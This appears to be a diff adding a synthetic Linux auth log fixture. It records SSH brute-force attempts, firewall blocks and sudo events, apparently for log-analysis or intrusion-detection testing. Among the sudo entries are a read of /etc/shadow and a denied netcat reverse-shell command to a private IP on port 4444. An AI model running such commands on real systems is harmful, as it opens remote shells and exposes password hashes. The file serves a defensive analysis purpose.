@@ -1,0 +1,50 @@
+Mar 15 07:45:01 webserver sshd[1100]: Accepted publickey for deploy from 10.0.1.5 port 52143 ssh2
+Mar 15 07:45:01 webserver sshd[1100]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Mar 15 07:52:33 webserver sshd[1115]: Accepted password for admin from 192.168.1.22 port 43821 ssh2
+Mar 15 07:52:33 webserver sshd[1115]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Mar 15 08:00:01 webserver CRON[1200]: pam_unix(cron:session): session opened for user root by (uid=0)
+Mar 15 08:00:01 webserver CRON[1200]: pam_unix(cron:session): session closed for user root
+Mar 15 08:01:14 webserver sshd[1220]: Failed password for root from 45.33.32.156 port 38271 ssh2
+Mar 15 08:01:22 webserver sshd[1222]: Failed password for admin from 45.33.32.156 port 38280 ssh2
+Mar 15 08:03:47 webserver sshd[1250]: Accepted publickey for jenkins from 10.0.1.8 port 50022 ssh2
+Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 198.51.100.23 port 41221 ssh2
+Mar 15 08:05:14 webserver sshd[1261]: Failed password for root from 198.51.100.23 port 41224 ssh2
+Mar 15 08:05:17 webserver sshd[1262]: Failed password for root from 198.51.100.23 port 41227 ssh2
+Mar 15 08:05:20 webserver sshd[1263]: Failed password for root from 198.51.100.23 port 41230 ssh2
+Mar 15 08:05:23 webserver sshd[1264]: Failed password for root from 198.51.100.23 port 41233 ssh2
+Mar 15 08:05:26 webserver sshd[1265]: Failed password for root from 198.51.100.23 port 41236 ssh2
+Mar 15 08:05:29 webserver sshd[1266]: Failed password for root from 198.51.100.23 port 41239 ssh2
+Mar 15 08:06:01 webserver sshd[1270]: Invalid user postgres from 185.220.101.45 port 55001
+Mar 15 08:06:05 webserver sshd[1271]: Failed password for invalid user postgres from 185.220.101.45 port 55001 ssh2
+Mar 15 08:07:30 webserver sshd[1280]: Accepted publickey for deploy from 10.0.1.5 port 52200 ssh2
+Mar 15 08:10:00 webserver sshd[1300]: Failed password for nobody from 203.0.113.78 port 44123 ssh2
+Mar 15 08:10:44 webserver sshd[1310]: Accepted password for alice from 192.168.1.55 port 48901 ssh2
+Mar 15 08:15:00 webserver sshd[1320]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=91.108.4.1
+Mar 15 08:15:01 webserver sshd[1321]: Failed password for root from 91.108.4.1 port 39100 ssh2
+Mar 15 08:20:01 webserver CRON[1400]: pam_unix(cron:session): session opened for user www-data by (uid=0)
+Mar 15 08:22:15 webserver sshd[1420]: Accepted publickey for admin from 192.168.1.22 port 44005 ssh2
+Mar 15 08:22:15 webserver sshd[1420]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Mar 15 08:25:00 webserver sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+Mar 15 08:25:01 webserver sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar 15 08:30:00 webserver sudo:    eve : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Mar 15 08:30:05 webserver sudo:    eve : command not allowed ; TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -e /bin/bash 10.10.10.99 4444
+Mar 15 08:30:10 webserver sshd[1500]: Disconnected from user admin 192.168.1.22 port 44005
+Mar 15 08:31:00 webserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:08:00 SRC=203.0.113.99 DST=10.0.1.1 LEN=44 TOS=0x00 PREC=0x00 TTL=51 ID=0 DF PROTO=TCP SPT=52891 DPT=4444 WINDOW=65535 RES=0x00 SYN URGP=0
+Mar 15 08:31:15 webserver sshd[1510]: Accepted password for bob from 192.168.1.33 port 51234 ssh2
+Mar 15 08:35:00 webserver sudo:    bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt-get update
+Mar 15 08:40:00 webserver sshd[1550]: Failed password for root from 198.51.100.55 port 33901 ssh2
+Mar 15 08:40:30 webserver sshd[1555]: Failed password for root from 198.51.100.55 port 33910 ssh2
+Mar 15 08:41:00 webserver sshd[1560]: Failed password for root from 198.51.100.55 port 33919 ssh2
+Mar 15 08:45:00 webserver sshd[1600]: Accepted publickey for jenkins from 10.0.1.8 port 50100 ssh2
+Mar 15 08:48:00 webserver sshd[1620]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Mar 15 08:50:00 webserver kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:08:00 SRC=45.33.32.200 DST=10.0.1.1 LEN=44 TOS=0x00 PREC=0x00 TTL=47 ID=0 DF PROTO=TCP SPT=49201 DPT=31337 WINDOW=65535 RES=0x00 SYN URGP=0
+Mar 15 08:55:00 webserver sshd[1650]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=root
+Mar 15 08:55:01 webserver sshd[1651]: Failed password for root from 203.0.113.10 port 55441 ssh2
+Mar 15 09:00:00 webserver sshd[1700]: Accepted publickey for deploy from 10.0.1.5 port 53001 ssh2
+Mar 15 09:00:00 webserver sshd[1700]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Mar 15 09:05:00 webserver sudo:    www-data : user NOT in sudoers ; TTY=? ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
+Mar 15 09:10:00 webserver sshd[1750]: Accepted password for alice from 192.168.1.55 port 49000 ssh2
+Mar 15 09:15:00 webserver sshd[1800]: Failed password for testuser from 162.243.134.71 port 38100 ssh2
+Mar 15 09:20:00 webserver sshd[1850]: Accepted publickey for admin from 192.168.1.22 port 45200 ssh2
+Mar 15 09:20:00 webserver sshd[1850]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Mar 15 09:25:00 webserver sshd[1900]: Accepted password for deploy from 10.0.1.5 port 53100 ssh2
